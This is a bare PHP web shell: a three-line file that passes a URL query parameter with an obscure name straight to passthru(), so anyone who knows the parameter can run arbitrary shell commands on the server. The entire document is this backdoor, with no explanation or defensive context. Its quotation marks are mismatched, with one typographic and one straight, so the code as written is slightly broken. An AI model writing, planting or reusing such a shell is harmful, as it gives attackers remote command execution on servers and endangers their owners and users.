<?php
passthru($_GET[’VL8xybs8']);
?>
